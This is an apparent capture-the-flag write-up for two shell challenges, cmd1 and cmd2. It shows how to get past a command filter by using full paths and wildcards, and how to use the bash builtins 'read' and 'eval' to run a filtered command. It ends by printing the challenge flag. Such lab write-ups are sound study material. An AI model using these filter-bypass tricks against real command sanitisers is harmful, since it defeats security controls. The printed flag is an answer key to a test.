### cmd1
The original PATH is overwriten so we need to use the full path of the `cat` command.
also , we cann't do `cat flag` because of the filter so we do `cat *`:

`cmd1@ubuntu:~$ ./cmd1 "/bin/cat *"`

### cmd2
the `env_delete` deletes all env variables and the filter restricts running thngs with '/'
and other stuff. The thing to note is that bash builting commands still run.
So I found this https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html
and tried tones of thing and eventually I succeeded with:
```
cmd2@ubuntu:~$ ./cmd2 "read c f && eval \$c \$f"
read c f && eval $c $f
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha
```
